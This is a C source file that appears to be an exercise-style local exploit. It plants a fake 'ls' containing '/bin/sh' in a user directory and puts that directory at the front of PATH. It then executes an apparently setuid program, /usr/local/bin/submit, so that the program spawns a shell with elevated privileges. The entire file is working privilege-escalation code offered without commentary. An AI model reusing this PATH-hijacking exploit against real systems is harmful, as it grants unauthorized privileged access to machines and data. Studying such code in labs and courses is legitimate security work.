#include <stdlib.h>
#include <stdio.h>
#include <sys/stat.h>

#define LS_FILE             "/home/user/ls"
#define TARGET      "/usr/local/bin/submit"
#define GETEGG              "/share/getegg"

char shellcode[] =
  "/bin/sh";

char path[] = 
  "PATH=/home/user:/usr/local/bin:/usr/bin:/bin:/usr/bin/X11:/usr/games";

void main(int argc, char *argv[]) {
  char *args[3];
  char *env[2];
  FILE *ls_file;

  ls_file = fopen(LS_FILE, "w+");
  fwrite(shellcode, 1, 7, ls_file);
  fclose(ls_file);

  chmod(LS_FILE, S_IRWXO | S_IRWXU | S_IRWXG);

  args[0] = TARGET;
  args[1] = "-s";
  args[2] = NULL;

  env[0] = path;
  env[1] = NULL;

  execve(args[0], args, env);
  exit(0);
}
